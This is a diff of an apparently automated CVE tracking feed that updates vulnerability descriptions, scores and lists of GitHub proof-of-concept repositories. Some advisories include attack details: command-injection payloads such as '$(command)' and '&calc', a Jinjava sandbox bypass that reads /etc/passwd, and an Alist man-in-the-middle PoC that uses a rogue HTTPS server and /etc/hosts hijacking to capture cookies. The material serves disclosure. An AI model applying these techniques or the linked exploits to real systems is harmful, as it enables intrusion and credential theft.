+      "https://github.com/Chocapikk/CVE-2026-24061",
+      "https://github.com/cumakurt/tscan",
       "https://github.com/r00tuser111/CVE-2026-24061",
-      "https://github.com/hackingyseguridad/root",
-      "https://github.com/BrainBob/CVE-2026-24061",
+      "https://github.com/TryA9ain/CVE-2026-24061",
+      "https://github.com/ridpath/Terrminus-CVE-2026-2406",
+      "https://github.com/cyberpoul/CVE-2026-24061-POC",
+      "https://github.com/madfxr/Twenty-Three-Scanner",
+      "https://github.com/Good123321-bot/good123321-bot.github.io",
+      "https://github.com/duy-31/CVE-2026-24061---telnetd",
+      "https://github.com/m3ngx1ng/cve_2026_24061_cli",
+      "https://github.com/z3n70/CVE-2026-24061",
+      "https://github.com/ibrahmsql/CVE-2026-24061-PoC",
+      "https://github.com/shivam-bathla/CVE-2026-24061-setup",
+      "https://github.com/xuemian168/CVE-2026-24061",
+      "https://github.com/X-croot/CVE-2026-24061_POC",
+      "https://github.com/h3athen/CVE-2026-24061",
+      "https://github.com/Gabs-hub/CVE-2026-24061_Lab",
+      "https://github.com/obrunolima1910/obrunolima1910.github.io",
+      "https://github.com/androidteacher/CVE-2026-24061-PoC-Telnetd",
       "https://github.com/franckferman/CVE_2026_24061_PoC",
+      "https://github.com/Mr-Zapi/CVE-2026-24061",
+      "https://github.com/obrunolima1910/CVE-2026-24061",
+      "https://github.com/0x7556/CVE-2026-24061",
+      "https://github.com/BrainBob/Telnet-TestVuln-CVE-2026-24061",
+      "https://github.com/Mefhika120/Ashwesker-CVE-2026-24061",
+      "https://github.com/Lingzesec/CVE-2026-24061-GUI",
+      "https://github.com/scumfrog/cve-2026-24061",
+      "https://github.com/ms0x08-dev/CVE-2026-24061-POC",
+      "https://github.com/lavabyte/telnet-CVE-2026-24061",
+      "https://github.com/monstertsl/CVE-2026-24061",
+      "https://github.com/buzz075/CVE-2026-24061",
+      "https://github.com/hilwa24/CVE-2026-24061",
+      "https://github.com/Ali-brarou/telnest",
+      "https://github.com/SafeBreach-Labs/CVE-2026-24061",
+      "https://github.com/BrainBob/CVE-2026-24061",
+      "https://github.com/killsystema/scan-cve-2026-24061",
+      "https://github.com/leonjza/inetutils-telnetd-auth-bypass",
+      "https://github.com/canpilayda/inetutils-telnetd-cve-2026-24061",
+      "https://github.com/Alter-N0X/CVE-2026-24061-POC",
+      "https://github.com/dotelpenguin/telnetd_CVE-2026-24061_tester",
+      "https://github.com/XsanFlip/CVE-2026-24061-Scanner",
+      "https://github.com/midox008/CVE-2026-24061",
+      "https://github.com/JayGLXR/CVE-2026-24061-POC",
+      "https://github.com/infat0x/CVE-2026-24061",
+      "https://github.com/LucasPDiniz/CVE-2026-24061",
+      "https://github.com/nrnw/CVE-2026-24061-GNU-inetutils-Telnet-Detector",
+      "https://github.com/0xXyc/telnet-inetutils-auth-bypass-CVE-2026-24061",
+      "https://github.com/punitdarji/telnetd-cve-2026-24061",
+      "https://github.com/Moxxic1/Tell-Me-Root",
+      "https://github.com/yanxinwu946/CVE-2026-24061--telnetd",
+      "https://github.com/Moxxic1/moxxic1.github.io",
+      "https://github.com/novitahk/Exploit-CVE-2026-24061",
+      "https://github.com/Good123321-bot/CVE-2026-24061-POC",
       "https://github.com/typeconfused/CVE-2026-24061",
       "https://github.com/parameciumzhang/Tell-Me-Root",
-      "https://github.com/TryA9ain/CVE-2026-24061",
-      "https://github.com/canpilayda/inetutils-telnetd-cve-2026-24061",
-      "https://github.com/scumfrog/cve-2026-24061",
-      "https://github.com/infat0x/CVE-2026-24061",
-      "https://github.com/obrunolima1910/obrunolima1910.github.io",
-      "https://github.com/0x7556/CVE-2026-24061",
-      "https://github.com/XsanFlip/CVE-2026-24061-Scanner",
-      "https://github.com/SafeBreach-Labs/CVE-2026-24061",
+      "https://github.com/SystemVll/CVE-2026-24061",
       "https://github.com/balgan/CVE-2026-24061",
-      "https://github.com/Alter-N0X/CVE-2026-24061-POC",
-      "https://github.com/Good123321-bot/good123321-bot.github.io",
-      "https://github.com/leonjza/inetutils-telnetd-auth-bypass",
-      "https://github.com/lavabyte/telnet-CVE-2026-24061",
-      "https://github.com/z3n70/CVE-2026-24061",
-      "https://github.com/dotelpenguin/telnetd_CVE-2026-24061_tester",
-      "https://github.com/buzz075/CVE-2026-24061",
-      "https://github.com/obrunolima1910/CVE-2026-24061",
-      "https://github.com/hilwa24/CVE-2026-24061",
-      "https://github.com/punitdarji/telnetd-cve-2026-24061",
-      "https://github.com/Parad0x7e/CVE-2026-24061",
-      "https://github.com/monstertsl/CVE-2026-24061",
-      "https://github.com/Moxxic1/Tell-Me-Root",
-      "https://github.com/Gabs-hub/CVE-2026-24061_Lab"
+      "https://github.com/FurkanKAYAPINAR/CVE-2026-24061-telnet2root",
+      "https://github.com/hackingyseguridad/root"
     ],
     "updated": "2026-01-29T21:30:27",
     "epss": 29.552
@@ -8933,7 +8954,7 @@
     ],
     "description": "IBM Aspera Console 3.4.0 through 3.4.8 is vulnerable to SQL injection. A remote attacker could send specially crafted SQL statements, which could allow the attacker to view, add, modify, or delete information in the back-end database.",
     "repos": [],
-    "updated": "2026-02-05T14:57:20.563000",
+    "updated": "2026-02-05T15:31:15",
     "epss": 0.094
   },
   "CVE-2025-40551": {
@@ -9174,7 +9195,7 @@
     ],
     "description": "SolarWinds Web Help Desk was found to be susceptible to an untrusted data deserialization vulnerability that could lead to remote code execution, which would allow an attacker to run commands on the host machine. This could be exploited without authentication.",
     "repos": [],
-    "updated": "2026-02-03T21:31:50",
+    "updated": "2026-02-04T02:00:02.030000",
     "epss": 22.938
   },
   "CVE-2025-22224": {
@@ -9286,7 +9307,7 @@
     ],
     "description": "VMware ESXi, Workstation, and Fusion contain\u00a0an information disclosure vulnerability due to an out-of-bounds read in HGFS.\u00a0A malicious actor with administrative privileges to a virtual machine may be able to exploit this issue to leak memory from the vmx process.",
     "repos": [],
-    "updated": "2025-10-30T19:52:41.973000",
+    "updated": "2025-10-22T00:33:13",
     "epss": 6.016
   },
   "CVE-2025-11730": {
@@ -9340,7 +9361,7 @@
     ],
     "description": "A post\u2011authentication command injection vulnerability in the Dynamic DNS (DDNS) configuration CLI command in Zyxel ATP series firmware versions from V5.35 through V5.41, USG FLEX series firmware versions from V5.35 through V5.41, USG FLEX 50(W) series firmware versions from V5.35 through V5.41, and USG20(W)-VPN series firmware versions from V5.35 through V5.41 could allow an authenticated attacker with administrator privileges to execute operating system (OS) commands on an affected device by supplying a specially crafted string as an argument to the CLI command.",
     "repos": [],
-    "updated": "2026-02-05T03:30:23",
+    "updated": "2026-02-05T14:57:20.563000",
     "epss": 0.196
   },
   "CVE-2025-8088": {
@@ -9477,33 +9498,33 @@
     ],
     "description": "A path traversal vulnerability affecting the Windows version of WinRAR allows the attackers to execute arbitrary code by crafting malicious archive files. This vulnerability was exploited in the wild and was discovered by\u00a0Anton Cherepanov, Peter Ko\u0161in\u00e1r, and Peter Str\u00fd\u010dek\n     from ESET.",
     "repos": [
-      "https://github.com/techcorp/CVE-2025-8088-Exploit",
-      "https://github.com/AdityaBhatt3010/CVE-2025-8088-WinRAR-Zero-Day-Path-Traversal",
-      "https://github.com/pentestfunctions/best-CVE-2025-8088",
-      "https://github.com/knight0x07/WinRAR-CVE-2025-8088-PoC-RAR",
-      "https://github.com/hexsecteam/CVE-2025-8088-Winrar-Tool",
-      "https://github.com/xi0onamdev/WinRAR-CVE-2025-8088-Exploitation-Toolkit",
-      "https://github.com/sxyrxyy/CVE-2025-8088-WinRAR-Proof-of-Concept-PoC-Exploit-",
-      "https://github.com/lucyna77/winrar-exploit",
-      "https://github.com/travisbgreen/cve-2025-8088",
-      "https://github.com/hbesljx/CVE-2025-8088-EXP",
-      "https://github.com/nhattanhh/CVE-2025-8088",
+      "https://github.com/0xAbolfazl/CVE-2025-8088-WinRAR-PathTraversal-PoC",
       "https://github.com/papcaii2004/CVE-2025-8088-WinRAR-builder",
-      "https://github.com/Markusino488/cve-2025-8088",
+      "https://github.com/pexlexity/WinRAR-CVE-2025-8088-Path-Traversal-PoC",
+      "https://github.com/pentestfunctions/best-CVE-2025-8088",
+      "https://github.com/Syrins/CVE-2025-8088-Winrar-Tool-Gui",
+      "https://github.com/lucyna77/winrar-exploit",
+      "https://github.com/sxyrxyy/CVE-2025-8088-WinRAR-Proof-of-Concept-PoC-Exploit-",
+      "https://github.com/pentestfunctions/CVE-2025-8088-Multi-Document",
+      "https://github.com/knight0x07/WinRAR-CVE-2025-8088-PoC-RAR",
+      "https://github.com/xi0onamdev/WinRAR-CVE-2025-8088-Exploitation-Toolkit",
+      "https://github.com/travisbgreen/cve-2025-8088",
+      "https://github.com/nhattanhh/CVE-2025-8088",
       "https://github.com/kitsuneshade/WinRAR-Exploit-Tool---Rust-Edition",
+      "https://github.com/hexsecteam/CVE-2025-8088-Winrar-Tool",
+      "https://github.com/nuky-alt/CVE-2025-8088",
+      "https://github.com/Markusino488/cve-2025-8088",
+      "https://github.com/DeepBlue-dot/CVE-2025-8088-WinRAR-Startup-PoC",
+      "https://github.com/onlytoxi/CVE-2025-8088-Winrar-Tool",
       "https://github.com/Shinkirou789/Cve-2025-8088-WinRar-vulnerability",
       "https://github.com/pescada-dev/-CVE-2025-8088",
-      "https://github.com/DeepBlue-dot/CVE-2025-8088-WinRAR-Startup-PoC",
-      "https://github.com/pentestfunctions/CVE-2025-8088-Multi-Document",
-      "https://github.com/walidpyh/CVE-2025-8088",
-      "https://github.com/Syrins/CVE-2025-8088-Winrar-Tool-Gui",
-      "https://github.com/jordan922/CVE-2025-8088",
-      "https://github.com/ghostn4444/CVE-2025-8088",
-      "https://github.com/pexlexity/WinRAR-CVE-2025-8088-Path-Traversal-PoC",
+      "https://github.com/AdityaBhatt3010/CVE-2025-8088-WinRAR-Zero-Day-Path-Traversal",
       "https://github.com/ilhamrzr/RAR-Anomaly-Inspector",
-      "https://github.com/nuky-alt/CVE-2025-8088",
-      "https://github.com/onlytoxi/CVE-2025-8088-Winrar-Tool",
-      "https://github.com/0xAbolfazl/CVE-2025-8088-WinRAR-PathTraversal-PoC"
+      "https://github.com/walidpyh/CVE-2025-8088",
+      "https://github.com/hbesljx/CVE-2025-8088-EXP",
+      "https://github.com/ghostn4444/CVE-2025-8088",
+      "https://github.com/techcorp/CVE-2025-8088-Exploit",
+      "https://github.com/jordan922/CVE-2025-8088"
     ],
     "updated": "2025-10-22T00:34:26",
     "epss": 3.898
@@ -9535,7 +9556,7 @@
           "header_static": "https://ioc.exchange/headers/original/missing.png",
           "followers_count": 63,
           "following_count": 0,
-          "statuses_count": 1065,
+          "statuses_count": 1076,
           "last_status_at": "2026-02-08",
           "hide_collections": false,
           "emojis": [],
@@ -9548,7 +9569,7 @@
     ],
     "description": "A flaw was found in QEMU. If the QIOChannelWebsock object is freed while it is waiting to complete a handshake, a GSource is leaked. This can lead to the callback firing later on and triggering a use-after-free in the use of the channel. This can be abused by a malicious client with network access to the VNC WebSocket port to cause a denial of service during the WebSocket handshake prior to the VNC client authentication.",
     "repos": [],
-    "updated": "2026-02-05T21:33:38",
+    "updated": "2026-02-05T20:15:52.003000",
     "epss": 0.099
   },
   "CVE-2025-10314": {
@@ -9770,8 +9791,8 @@
     "epss": 0.08800000000000001
   },
   "CVE-2026-25585": {
-    "cvss3": 0,
-    "severity": null,
+    "cvss3": 7.8,
+    "severity": "HIGH",
     "epss_severity": "LOW",
     "nuclei": null,
     "posts": [
@@ -9818,9 +9839,9 @@
         "created_at": "2026-02-05T00:23:08.000Z"
       }
     ],
-    "description": "N/A",
+    "description": "iccDEV provides a set of libraries and tools that allow for the interaction, manipulation, and application of ICC color management profiles. Prior to version 2.3.1.3, there is a vulnerability IccCmm.cpp:5793 when reading through index during ICC profile processing. The malformed ICC profile triggers improper array bounds validation in the color management module, resulting in an out-of-bounds read that can lead to memory disclosure or segmentation fault from accessing memory beyond the array boundary. This issue has been patched in version 2.3.1.3.",
     "repos": [],
-    "updated": null,
+    "updated": "2026-02-05T14:57:20.563000",
     "epss": 0.012
   },
   "CVE-2026-22038": {
@@ -10022,11 +10043,11 @@
         "created_at": "2026-02-04T22:17:32.000Z"
       }
     ],
-    "description": "Godot MCP is a Model Context Protocol (MCP) server for interacting with the Godot game engine. Prior to version 0.1.1, a command injection vulnerability in godot-mcp allows remote code execution. The executeOperation function passed user-controlled input (e.g., projectPath) directly to exec(), which spawns a shell. An attacker could inject shell metacharacters like $(command) or &calc to execute arbitrary commands with the privileges of the MCP server process. This affects any tool that accepts projectPath, including create_scene, add_node, load_sprite, and others. This issue has been patched in version 0.1.1.",
+    "description": "### Impact \nA Command Injection vulnerability in godot-mcp allows remote code execution. The `executeOperation` function passed user-controlled input (e.g., `projectPath`) directly to `exec()`, which spawns a shell. An attacker could inject shell metacharacters like `$(command)` or `&calc` to execute arbitrary commands with the privileges of the MCP server process. \n\nThis affects any tool that accepts `projectPath`, including `create_scene`, `add_node`, `load_sprite`, and others. \n\n### Patches \nFixed in version 0.1.1 by switching from `exec()` to `execFile()`, which does not invoke a shell. \n\n### Workarounds \nNone. Users should upgrade immediately. \n\n### Resources\n - https://github.com/Coding-Solo/godot-mcp/issues/64\n - https://github.com/Coding-Solo/godot-mcp/pull/67",
     "repos": [
       "https://github.com/mbanyamer/CVE-2026-25546-godot-mcp-0.1.1-OS-Command-Injection"
     ],
-    "updated": "2026-02-05T14:57:20.563000",
+    "updated": "2026-02-08T03:14:10",
     "epss": 0.06999999999999999
   },
   "CVE-2026-25526": {
@@ -10078,9 +10099,9 @@
         "created_at": "2026-02-04T22:17:37.000Z"
       }
     ],
-    "description": "## Impact\n\n**Vulnerability Type**: Sandbox Bypass / Remote Code Execution\n\n**Affected Component**: Jinjava\n\n**Affected Users**:\n- Organizations using HubSpot's Jinjava template rendering engine for user-provided template content\n- Any system that renders untrusted Jinja templates using HubSpot's Jinjava implementation\n- Users with the ability to create or edit custom code templates\n\n**Severity**: **Critical** - allows arbitrary Java class instantiation and file access bypassing built-in sandbox restrictions\n\n**Root Cause**: Multiple security bypass vulnerabilities in Jinjava's sandbox mechanism:\n\n1. **ForTag Property Access Bypass**: The `ForTag` class does not enforce `JinjavaBeanELResolver` restrictions when iterating over object properties using `Introspector.getBeanInfo()` and invoking getter methods via `PropertyDescriptor.getReadMethod()`\n\n2. **Restricted Class Instantiation**: The sandbox's type allowlist can be bypassed by using ObjectMapper to instantiate classes through JSON deserialization, including creating new `JinjavaELContext` and `JinjavaConfig` instances\n\n**Attack Vector**: An attacker with the ability to create or edit Jinja templates can:\n- Access arbitrary getter methods on objects in the template context\n- Instantiate `ObjectMapper` to enable default typing\n- Create arbitrary Java classes by bypassing type allowlists\n- Read files from the server filesystem (demonstrated with `/etc/passwd`)\n- Potentially execute arbitrary code\n\n## Patches\n\n**Status**: Patched - CVE-2026-25526\n\nUsers should upgrade to one of the following versions which contain fixes for this vulnerability:\n\n- **JinJava 2.8.3** or later\n- **JinJava 2.7.6** or later\n\n**Fix Components**:\n\n1. **ForTag Security Hardening**\n   - Added security checks to `ForTag.renderForCollection()` to enforce `JinjavaBeanELResolver` restrictions\n   - Implemented property access validation against restricted properties/methods before invoking getter methods\n   - Added checks for restricted class types before introspection\n\n2. **Enhanced Type Validation**\n   - Improved validation in `JinjavaBeanELResolver.isRestrictedClass()` to prevent instantiation of sensitive types\n   - Added additional restricted types to the denylist\n   - Implemented deeper validation for types created via ObjectMapper deserialization\n\n3. **Configuration Protection**\n   - Added checks to prevent creation of new `JinjavaConfig` or `JinjavaELContext` instances via ObjectMapper\n   - Prevented modification of `readOnlyResolver` configuration from untrusted templates\n   - Implemented additional safeguards around ELResolver configuration\n\n4. **Collection Type Validation**\n   - Implemented proper type validation in `HubLELResolver` to prevent collection type wrapping bypasses\n   - Added checks for wrapped types in collection deserialization\n   - Implemented validation for all types within collections against allowlists\n\n5. **ObjectMapper Restrictions**\n   - Added additional restrictions on `ObjectMapper.enableDefaultTyping()` to prevent enabling via less restrictive ELResolver\n   - Ensured default typing cannot be enabled without proper authorization\n\n**Information for Users**: Upgrade to version 2.8.3 or 2.7.6 or later to address this vulnerability.\n\n## References\n\n### Project Resources\n- **Jinjava Source Code**: [github.com/HubSpot/jinjava](https://github.com/HubSpot/jinjava)\n- **Jinjava Releases**: [github.com/HubSpot/jinjava/releases](https://github.com/HubSpot/jinjava/releases)\n\n### Security Standards & Classifications\n- **CWE-502**: Deserialization of Untrusted Data\n- **CWE-913**: Improper Control of Dynamically-Managed Code Resources\n- **CWE-94**: Improper Control of Generation of Code ('Code Injection')\n- **CVSS v3.1**: Common Vulnerability Scoring System\n\n### Additional Resources\n- [OWASP Template Injection](https://owasp.org/www-community/attacks/Server_Side_Template_Injection)\n- [Java Deserialization Security](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)\n- [CVE Standards and Procedures](https://cve.mitre.org/)",
+    "description": "JinJava is a Java-based template engine based on django template syntax, adapted to render jinja templates. Prior to versions 2.7.6 and 2.8.3, JinJava is vulnerable to arbitrary Java execution via bypass through ForTag. This allows arbitrary Java class instantiation and file access bypassing built-in sandbox restrictions. This issue has been patched in versions 2.7.6 and 2.8.3.",
     "repos": [],
-    "updated": "2026-02-05T00:35:16",
+    "updated": "2026-02-05T14:57:20.563000",
     "epss": 0.074
   },
   "CVE-2026-25539": {
@@ -10138,8 +10159,8 @@
     "epss": 0.268
   },
   "CVE-2026-25584": {
-    "cvss3": 7.8,
-    "severity": "HIGH",
+    "cvss3": 0,
+    "severity": null,
     "epss_severity": "LOW",
     "nuclei": null,
     "posts": [
@@ -10186,14 +10207,14 @@
         "created_at": "2026-02-04T22:17:04.000Z"
       }
     ],
-    "description": "iccDEV provides a set of libraries and tools that allow for the interaction, manipulation, and application of ICC color management profiles. Prior to version 2.3.1.3, there is a stack-buffer-overflow vulnerability in CIccTagFloatNum<>::GetValues(). This is triggered when processing a malformed ICC profile. The vulnerability allows an out-of-bounds write on the stack, potentially leading to memory corruption, information disclosure, or code execution when processing specially crafted ICC files. This issue has been patched in version 2.3.1.3.",
+    "description": "N/A",
     "repos": [],
-    "updated": "2026-02-05T14:57:20.563000",
+    "updated": null,
     "epss": 0.013
   },
   "CVE-2026-25583": {
-    "cvss3": 0,
-    "severity": null,
+    "cvss3": 7.8,
+    "severity": "HIGH",
     "epss_severity": "LOW",
     "nuclei": null,
     "posts": [
@@ -10240,14 +10261,14 @@
         "created_at": "2026-02-04T22:16:54.000Z"
       }
     ],
-    "description": "N/A",
+    "description": "iccDEV provides a set of libraries and tools that allow for the interaction, manipulation, and application of ICC color management profiles. Prior to version 2.3.1.3, there is a heap buffer overflow vulnerability in CIccFileIO::Read8() when processing malformed ICC profile files via unchecked fread operation. This issue has been patched in version 2.3.1.3.",
     "repos": [],
-    "updated": null,
+    "updated": "2026-02-05T14:57:20.563000",
     "epss": 0.012
   },
   "CVE-2026-25582": {
-    "cvss3": 0,
-    "severity": null,
+    "cvss3": 7.8,
+    "severity": "HIGH",
     "epss_severity": "LOW",
     "nuclei": null,
     "posts": [
@@ -10294,9 +10315,9 @@
         "created_at": "2026-02-04T22:16:43.000Z"
       }
     ],
-    "description": "N/A",
+    "description": "iccDEV provides a set of libraries and tools that allow for the interaction, manipulation, and application of ICC color management profiles. Prior to version 2.3.1.3, there is a heap buffer overflow (read) vulnerability in CIccIO::WriteUInt16Float() when converting malformed XML to ICC profiles via iccFromXml tool. This issue has been patched in version 2.3.1.3.",
     "repos": [],
-    "updated": null,
+    "updated": "2026-02-05T14:57:20.563000",
     "epss": 0.012
   },
   "CVE-2025-60865": {
@@ -10350,7 +10371,7 @@
     ],
     "description": "Insecure Permissions vulnerability in avanquest Driver Updater v.9.1.57803.1174 allows a local attacker to escalate privileges via the Driver Updater Service windows component.",
     "repos": [],
-    "updated": "2026-02-04T17:16:08.510000",
+    "updated": "2026-02-04T18:31:36",
     "epss": 0.01
   },
   "CVE-2025-69620": {
@@ -10606,9 +10627,9 @@
         "created_at": "2026-02-04T21:15:14.000Z"
       }
     ],
-    "description": "An issue was discovered in Samsung Modem Exynos through 2025-08-29. Incorrect handling of NAS Registration messages leads to a Denial of Service because of Improper Handling of Exceptional Conditions.",
+    "description": "An issue was discovered in Samsung Mobile Processor, Wearable Processor and Modem Exynos 980, 990, 850, 1080, 9110, W920, W930, W1000 and Modem 5123. Incorrect handling of NAS Registration messages leads to a Denial of Service because of Improper Handling of Exceptional Conditions.",
     "repos": [],
-    "updated": "2026-02-04T21:30:32",
+    "updated": "2026-02-05T17:27:26.890000",
     "epss": 0.044000000000000004
   },
   "CVE-2025-63624": {
@@ -10662,7 +10683,7 @@
     ],
     "description": "SQL Injection vulnerability in Shandong Kede Electronics Co., Ltd IoT smart water meter monitoring platform v.1.0 allows a remote attacker to execute arbitrary code via the imei_list.aspx file.",
     "repos": [],
-    "updated": "2026-02-04T17:16:09.180000",
+    "updated": "2026-02-04T18:30:31",
     "epss": 0.16199999999999998
   },
   "CVE-2025-69875": {
@@ -10716,7 +10737,7 @@
     ],
     "description": "A vulnerability exists in Quick Heal Total Security 23.0.0 in the quarantine management component where insufficient validation of restore paths and improper permission handling allow a low-privileged local user to restore quarantined files into protected system directories. This behavior can be abused by a local attacker to place files in high-privilege locations, potentially leading to privilege escalation.",
     "repos": [],
-    "updated": "2026-02-04T21:30:32",
+    "updated": "2026-02-04T19:16:13.897000",
     "epss": 0.012
   },
   "CVE-2026-1633": {
@@ -10875,7 +10896,7 @@
     "cvss3": 9.8,
     "severity": "CRITICAL",
     "epss_severity": "MEDIUM",
-    "nuclei": "https://github.com/projectdiscovery/nuclei-templates/blob/868e4b4fcd0ef2bca8739b8971406ed55739b9d3/http/cves/2025/CVE-2025-49825.yaml",
+    "nuclei": "https://github.com/projectdiscovery/nuclei-templates/blob/80c2051bd6b1b4484ccb2a9459493ab7ddccacfc/http/cves/2025/CVE-2025-49825.yaml",
     "posts": [
       {
         "account": {
@@ -11126,9 +11147,9 @@
         "created_at": "2026-02-04T20:21:56.000Z"
       }
     ],
-    "description": "Alist is a file list program that supports multiple storages, powered by Gin and Solidjs. Prior to version 3.57.0, the application disables TLS certificate verification by default for all outgoing storage driver communications, making the system vulnerable to Man-in-the-Middle (MitM) attacks. This enables the complete decryption, theft, and manipulation of all data transmitted during storage operations, severely compromising the confidentiality and integrity of user data. This issue has been patched in version 3.57.0.",
+    "description": "### Summary\nThe application disables TLS certificate verification by default for all outgoing storage driver communications, making the system vulnerable to Man-in-the-Middle (MitM) attacks. This enables the complete decryption, theft, and manipulation of all data transmitted during storage operations, severely compromising the confidentiality and integrity of user data.\n\n### Details\nCertificate verification is disabled by default for all storage driver communications.\n\nThe `TlsInsecureSkipVerify` setting is default to true in the `DefaultConfig()` function in [internal/conf/config.go](https://github.com/AlistGo/alist/blob/b4d9beb49cba399842a54fcc33bc95a4a09b7bd4/internal/conf/config.go#L159).\n\n~~~go\nfunc DefaultConfig() *Config {\n    // ...\n    TlsInsecureSkipVerify: true,\n    // ...\n}\n~~~\n\nThis vulnerability enables Man-in-the-Middle (MitM) attacks by disabling TLS certificate verification, allowing attackers to intercept and manipulate all storage communications. Attackers can exploit this through network-level attacks like ARP spoofing, rogue Wi-Fi access points, or compromised internal network equipment to redirect traffic to malicious endpoints. Since certificate validation is skipped, the system will unknowingly establish encrypted connections with attacker-controlled servers, enabling full decryption, data theft, and manipulation of all storage operations without triggering any security warnings. \n\n\n\n#### PoC\nThe /etc/hosts file was modified to simulate DNS hijacking and redirect www.weiyun.com to a malicious TLS-enabled HTTP server.\n\nThe purpose of this Proof of Concept is to demonstrate that the Alist server will establish communication with a malicious server due to disabled certificate verification. This allows interception and theft of authentication cookies used for communicating with other storage providers.\n\n[Video](https://github.com/user-attachments/assets/5b042db0-d830-41d9-9cec-d2ba677ac53d)\n\n\n\n##### Setup a malicious https server:\n\nssl.conf:\n~~~\nLoadModule ssl_module modules/mod_ssl.so\nLoadModule log_config_module modules/mod_log_config.so\n\nListen 443\n\nLogFormat \"%h %l %u %t \\\"%r\\\" %>s %b Host:%{Host}i User-Agent:%{User-Agent}i Referer:%{Referer}i Accept:%{Accept}i Cookie:%{Cookie}i\" headers\nCustomLog \"/usr/local/apache2/logs/headers.log\" headers\n\n<VirtualHost _default_:443>\n    DocumentRoot \"/usr/local/apache2/htdocs\"\n    ServerName localhost\n\n    SSLEngine on\n    SSLCertificateFile \"/usr/local/apache2/conf/server.crt\"\n    SSLCertificateKeyFile \"/usr/local/apache2/conf/server.key\"\n\n    ErrorLog \"/usr/local/apache2/logs/ssl_error.log\"\n\n    <Directory \"/usr/local/apache2/htdocs\">\n        Options Indexes FollowSymLinks\n        AllowOverride None\n        Require all granted\n    </Directory>\n</VirtualHost>\n~~~\n\nDockerfile:\n~~~\nFROM httpd:2.4\n\n# Copy SSL config\nCOPY ssl.conf /usr/local/apache2/conf/extra/ssl.conf\n\n# Include SSL config in main httpd.conf\nRUN echo \"Include conf/extra/ssl.conf\" >> /usr/local/apache2/conf/httpd.conf\n\n# Copy certs\nCOPY certs/server.crt /usr/local/apache2/conf/server.crt\nCOPY certs/server.key /usr/local/apache2/conf/server.key\n~~~\n\nScripts to run https server:\n\n~~~bash\nmkdir certs\nopenssl req -x509 -nodes -days 365 \\\n  -newkey rsa:2048 \\\n  -keyout certs/server.key \\\n  -out certs/server.crt\ndocker build -t httpd-ssl .\ndocker run -dit --name my-https-server httpd-ssl\n~~~\n\n##### Run alist\n~~~bash\ndocker run -d --restart=unless-stopped -v /etc/alist:/opt/alist/data -p 5244:5244 -e PUID=0 -e PGID=0 -e UMASK=022 --name=\"alist\" alist666/alist:latest\n~~~\n\nSimulate DNS hijacking: Modify container's /etc/hosts to redirect www.weiyun.com to malicious server\n~~~\n<IP of HTTPS Server>      www.weiyun.com\n~~~\n\nIn the front end, add a weiyun storage and inspect log on tls server:\n~~~\nroot@f6d0f5bebe60:/usr/local/apache2# cat /usr/local/apache2/logs/headers.log\n172.17.0.3 - - [30/Oct/2025:03:52:58 +0000] \"GET /disk HTTP/1.1\" 404 196 Host:www.weiyun.com User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Referer:- Accept:- Cookie:WhatEverSecret=\n~~~\n\nNote that the cookie is in the log.\n\n### Impact\nThis misconfiguration allows attackers to perform man in the middle attack, which potentially leads to the complete decryption, theft, and manipulation of all data transmitted during storage operations, severely compromising the confidentiality and integrity of user data.\n\nThis vulnerability affects all alist deployment.\n\n### Credit\nThis vulnerability was discovered by:\n- XlabAI Team of Tencent Xuanwu Lab\n- Atuin Automated Vulnerability Discovery Engine\n\nIf there are any questions regarding the vulnerability details, please feel free to reach out for further discussion at xlabai@tencent.com.",
     "repos": [],
-    "updated": "2026-02-05T14:57:20.563000",
+    "updated": "2026-02-04T21:56:51",
     "epss": 0.015
   },
   "CVE-2026-25157": {
@@ -11318,9 +11339,9 @@
         "created_at": "2026-02-04T20:21:35.000Z"
       }
     ],
-    "description": "melange allows users to build apk packages using declarative pipelines. From version 0.10.0 to before 0.40.3, an attacker who can influence inputs to the patch pipeline could execute arbitrary shell commands on the build host. The patch pipeline in pkg/build/pipelines/patch.yaml embeds input-derived values (series paths, patch filenames, and numeric parameters) into shell scripts without proper quoting or validation, allowing shell metacharacters to break out of their intended context. The vulnerability affects the built-in patch pipeline which can be invoked through melange build and melange license-check operations. An attacker who can control patch-related inputs (e.g., through pull request-driven CI, build-as-a-service, or by influencing melange configurations) can inject shell metacharacters such as backticks, command substitutions $(\u2026), semicolons, pipes, or redirections to execute arbitrary commands with the privileges of the melange build process. This issue has been patched in version 0.40.3.",
+    "description": "An attacker who can influence inputs to the patch pipeline could execute arbitrary shell commands on the build host. The patch pipeline in pkg/build/pipelines/patch.yaml embeds input-derived values (series paths, patch filenames, and numeric parameters) into shell scripts without proper quoting or validation, allowing shell metacharacters to break out of their intended context.                                                                                                                                                               \n                                                                                                                                                                                        \nThe vulnerability affects the built-in patch pipeline which can be invoked through melange build and melange license-check operations. An attacker who can control patch-related inputs (e.g., through pull request-driven CI, build-as-a-service, or by influencing melange configurations) can inject shell metacharacters such as backticks, command substitutions  $(\u2026), semicolons, pipes, or redirections to execute arbitrary commands with the privileges of the melange build process.                                                              \n\nFix: Fixed in [bd132535](https://github.com/chainguard-dev/melange/commit/bd132535cd9f57d4bd39d9ead0633598941af030) ,  Released in 0.40.3.\n                                                                                                                                                                                 \nAcknowledgements                                                                                                                                                                      \n                                                                                                                                                                                        \nmelange thanks Oleh Konko (@1seal) from 1seal for discovering and reporting this issue.",
     "repos": [],
-    "updated": "2026-02-05T14:57:20.563000",
+    "updated": "2026-02-04T21:56:11",
     "epss": 0.017
   },
   "CVE-2026-24843": {
@@ -11372,9 +11393,9 @@
         "created_at": "2026-02-04T20:22:19.000Z"
       }
     ],
-    "description": "An attacker who can influence the tar stream from a QEMU guest VM could write files outside the intended workspace directory on the host. The `retrieveWorkspace` function extracts tar entries without validating that paths stay within the workspace, allowing Path Traversal via `../` sequences.\n\n**Fix:** Fixed in [6e243d0d](https://github.com/chainguard-dev/melange/commit/6e243d0d46699f837d7c392397a694d2bcc7612b). Merged in release.\n\n**Acknowledgements**\n\nmelange thanks Oleh Konko from [1seal](https://1seal.org/) for discovering and reporting this issue.",
+    "description": "melange allows users to build apk packages using declarative pipelines. In version 0.11.3 to before 0.40.3, an attacker who can influence the tar stream from a QEMU guest VM could write files outside the intended workspace directory on the host. The retrieveWorkspace function extracts tar entries without validating that paths stay within the workspace, allowing path traversal via ../ sequences. This issue has been patched in version 0.40.3.",
     "repos": [],
-    "updated": "2026-02-04T21:55:21",
